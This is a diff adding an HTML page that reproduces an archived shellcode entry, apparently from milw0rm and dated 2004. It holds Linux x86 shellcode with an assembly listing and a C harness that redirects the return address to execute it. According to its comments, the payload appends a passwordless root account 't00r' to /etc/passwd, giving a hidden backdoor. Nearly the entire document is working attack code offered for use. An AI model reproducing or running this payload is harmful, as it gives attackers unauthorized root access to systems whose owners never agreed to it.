@@ -1,0 +1,53 @@
+<html><head><title>linux/x86 add user t00r 82 bytes</title></head><pre>/*
+ * s0t4ipv6@shellcode.com.ar
+ * 0x14abril0x7d2
+ *
+ * 82 bytes 
+ * Agrega la linea &quot;t00r::0:0::/:/bin/sh&quot; en /etc/passwd
+ *
+ * Encriptada en http://www.shellcode.com.ar/linux/lnx-t00r-cr1.c
+ * 
+*/
+
+#include &lt;stdio.h&gt;
+
+// Shellcode			// Asm Code
+char shellcode[]=
+&quot;\x31\xc0&quot;                      // xorl         %eax,%eax
+&quot;\x50&quot;                          // pushl        %eax
+&quot;\x68\x73\x73\x77\x64&quot;          // pushl        $0x64777373
+&quot;\x68\x63\x2f\x70\x61&quot;          // pushl        $0x61702f63
+&quot;\x68\x2f\x2f\x65\x74&quot;          // pushl        $0x74652f2f
+&quot;\x89\xe3&quot;                      // movl         %esp,%ebx
+&quot;\x8d\x48\x02&quot;                  // leal         0x2(%eax),%ecx
+&quot;\x8d\x40\x05&quot;                  // leal         0x5(%eax),%eax
+&quot;\xcd\x80&quot;                      // int          $0x80
+&quot;\x89\xc3&quot;                      // movl         %eax,%ebx
+&quot;\x87\xca&quot;                      // xchgl        %ecx,%edx
+&quot;\x31\xc9&quot;                      // xorl         %ecx,%ecx
+&quot;\xb0\x13&quot;                      // movb         $0x13,%al
+&quot;\xcd\x80&quot;                      // int          $0x80
+&quot;\x51&quot;                          // pushl        %ecx
+&quot;\x68\x6e\x2f\x73\x68&quot;          // pushl        $0x68732f6e
+&quot;\x68\x3a\x2f\x62\x69&quot;          // pushl        $0x69622f3a
+&quot;\x68\x30\x3a\x3a\x2f&quot;          // pushl        $0x2f3a3a30
+&quot;\x68\x3a\x3a\x30\x3a&quot;          // pushl        $0x3a303a3a
+&quot;\x68\x74\x30\x30\x72&quot;          // pushl        $0x72303074
+&quot;\x8d\x41\x04&quot;                  // leal         0x4(%ecx),%eax
+&quot;\x89\xe1&quot;                      // movl         %esp,%ecx
+&quot;\xb2\x14&quot;                      // movb         $0x14,%dl
+&quot;\xcd\x80&quot;                      // int          $0x80
+&quot;\x31\xc0&quot;                      // xorl         %eax,%eax
+&quot;\xb0\x06&quot;                      // movb         $0x6,%al
+&quot;\xcd\x80&quot;                      // int          $0x80
+&quot;\x40&quot;                          // incl         %eax
+&quot;\xcd\x80&quot;;                     // int          $0x80
+
+main() {
+	int *ret;
+	ret=(int *)&amp;ret+2;
+	printf(&quot;Shellcode lenght=%d\n&quot;,strlen(shellcode));
+	(*ret) = (int)shellcode;
+}
+
+// milw0rm.com [2004-09-12]</pre></html>
